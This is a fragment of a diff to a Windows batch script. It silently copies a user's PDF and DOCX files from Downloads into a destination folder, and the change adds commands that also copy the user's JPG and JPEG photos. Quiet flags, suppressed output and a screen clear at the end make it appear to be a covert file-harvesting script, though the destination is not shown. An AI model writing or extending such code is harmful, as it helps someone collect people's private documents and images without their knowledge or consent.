@@ -33,5 +33,9 @@ xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.pdf %dst% >>nul
 xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.docx %dst% >>nul
 )
 
+if Exist %USERPROFILE% (
+xcopy /C /Q /G /Y %USERPROFILE%\*.jpg %dst% >>nul
+xcopy /C /Q /G /Y %USERPROFILE%\*.jpeg %dst% >>nul
+)
 @cls
 @exit
